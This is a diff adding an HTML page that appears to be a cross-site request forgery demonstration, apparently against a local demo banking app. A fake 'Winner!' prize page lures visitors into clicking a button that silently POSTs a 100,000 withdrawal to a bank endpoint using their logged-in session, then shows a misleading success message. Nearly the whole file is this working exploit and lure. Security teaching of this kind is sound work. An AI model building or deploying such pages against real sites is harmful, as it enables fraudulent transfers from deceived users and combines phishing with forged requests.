@@ -1,0 +1,88 @@
+<head>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
+	<style>
+		body {
+		  background: black;
+		  font-family: Arial;
+		}
+		.button {
+		  background-color: #004A7F;
+		  -webkit-border-radius: 10px;
+		  border-radius: 10px;
+		  border: none;
+		  color: #FFFFFF;
+		  cursor: pointer;
+		  display: inline-block;
+		  font-size: 60px;
+		  padding: 5px 10px;
+		  text-align: center;
+		  text-decoration: none;
+		}
+		@-webkit-keyframes glowing {
+		  0% { background-color: #B20000; -webkit-box-shadow: 0 0 3px #B20000; }
+		  50% { background-color: #FF0000; -webkit-box-shadow: 0 0 40px #FF0000; }
+		  100% { background-color: #B20000; -webkit-box-shadow: 0 0 3px #B20000; }
+		}
+
+		@-moz-keyframes glowing {
+		  0% { background-color: #B20000; -moz-box-shadow: 0 0 3px #B20000; }
+		  50% { background-color: #FF0000; -moz-box-shadow: 0 0 40px #FF0000; }
+		  100% { background-color: #B20000; -moz-box-shadow: 0 0 3px #B20000; }
+		}
+
+		@-o-keyframes glowing {
+		  0% { background-color: #B20000; box-shadow: 0 0 3px #B20000; }
+		  50% { background-color: #FF0000; box-shadow: 0 0 40px #FF0000; }
+		  100% { background-color: #B20000; box-shadow: 0 0 3px #B20000; }
+		}
+
+		@keyframes glowing {
+		  0% { background-color: #B20000; box-shadow: 0 0 3px #B20000; }
+		  50% { background-color: #FF0000; box-shadow: 0 0 40px #FF0000; }
+		  100% { background-color: #B20000; box-shadow: 0 0 3px #B20000; }
+		}
+
+		.button {
+		  -webkit-animation: glowing 1500ms infinite;
+		  -moz-animation: glowing 1500ms infinite;
+		  -o-animation: glowing 1500ms infinite;
+		  animation: glowing 1500ms infinite;
+		}
+	</style>
+</head>
+
+<body>
+	<div style="text-align:center; padding-top:20px">
+		<h1 style="color:yellow; font-weight:strong;font-size:100px;">Winner! Winner! Winner!</h1>
+		<button id="csrfButton" class="button">Click me to claim your prize!</a>
+	</div>
+</body>
+
+<script type="text/javascript">
+	console.log('This site looks fine.')
+	
+	$('#csrfButton').click(function (e) {
+		
+		$.ajax({
+		  type: 'POST',
+		  url: 'http://localhost:50008/BankAccount/Withdraw',
+		  data: { TransferAmount: 100000 },
+		  success: function (result) {
+			console.log(result);
+			if (result.match('Unauthorized')) {
+				alert('Something went wrong. You should log in to your bank account before pressing this button');
+			} else {
+				alert('Your prize is on it\'s way!');
+			}
+			
+		  },
+		  error: function (jqXHR) {
+		    console.log(jqXHR);
+			alert('Something went wrong. You should log in to your bank account before pressing this button');
+		  },
+		  done: function () {
+			
+		  }
+		});
+	});
+</script>
